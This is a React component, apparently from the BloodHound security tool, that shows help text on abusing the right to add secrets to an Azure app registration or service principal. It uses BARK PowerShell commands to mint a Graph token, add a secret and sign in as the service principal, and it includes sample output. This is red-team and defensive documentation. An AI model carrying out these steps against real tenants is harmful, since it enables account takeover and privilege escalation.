// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Typography } from '@mui/material';

const Abuse: FC = () => {
    return (
        <>
            <Typography variant='body2'>
                There are several ways to perform this abuse, depending on what sort of access you have to the
                credentials of the object that holds this privilege against the target object. If you have an
                interactive web browser session for the Azure portal, it is as simple as finding the target App in the
                portal and adding a new secret to the object using the “Certificates & secrets” tab. Service Principals
                do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API.
            </Typography>

            <Typography variant='body2'>
                No matter what kind of control you have, you will be able to perform this abuse by using BARK’s
                New-AppRegSecret or New-ServicePrincipalSecret functions.
            </Typography>
            <Typography variant='body2'>
                These functions require you to supply an MS Graph-scoped JWT associated with the principal that has the
                privilege to add a new secret to your target application. There are several ways to acquire a JWT. For
                example, you may use BARK’s Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT by
                supplying a refresh token:
                <Typography component={'pre'}>
                    $MGToken = Get-GraphTokenWithRefreshToken -RefreshToken &quot;0.ARwA6WgJJ9X2qk…&quot; -TenantID
                    &quot;contoso.onmicrosoft.com&quot;
                </Typography>
            </Typography>

            <Typography variant='body2'>
                Then use BARK’s New-AppRegSecret to add a new secret to the target application:
                <Typography component={'pre'}>
                    New-AppRegSecret -AppRegObjectID &quot;d878…&quot; -Token $MGToken.access_token
                </Typography>
            </Typography>

            <Typography variant='body2'>
                The output will contain the plain-text secret you just created for the target app:
                <Typography component={'pre'}>
                    PS /Users/andyrobbins&gt; New-AppRegSecret -AppRegObjectID &quot;d878…&quot; -Token
                    $MGToken.access_token Name Value ---- ----- AppRegSecretValue odg8Q~... AppRegAppId 4d31…
                    AppRegObjectId d878…
                </Typography>
            </Typography>

            <Typography variant='body2'>
                With this plain text secret, you can now acquire tokens as the service principal associated with the
                app. You can easily do this with BARK’s Get-MSGraphToken function:
                <Typography component={'pre'}>
                    PS /Users/andyrobbins&gt; $SPToken = Get-MSGraphToken `-ClientID &quot;4d31…&quot; `-ClientSecret
                    &quot;odg8Q~...&quot; `-TenantName &quot;contoso.onmicrosoft.com&quot; PS /Users/andyrobbins&gt;
                    $SPToken.access_token eyJ0eXAiOiJKV1QiLCJub…
                </Typography>
            </Typography>

            <Typography variant='body2'>
                Now you can use this JWT to perform actions against any other MS Graph endpoint as the service
                principal, continuing your attack path with the privileges of that service principal.
            </Typography>
        </>
    );
};

export default Abuse;
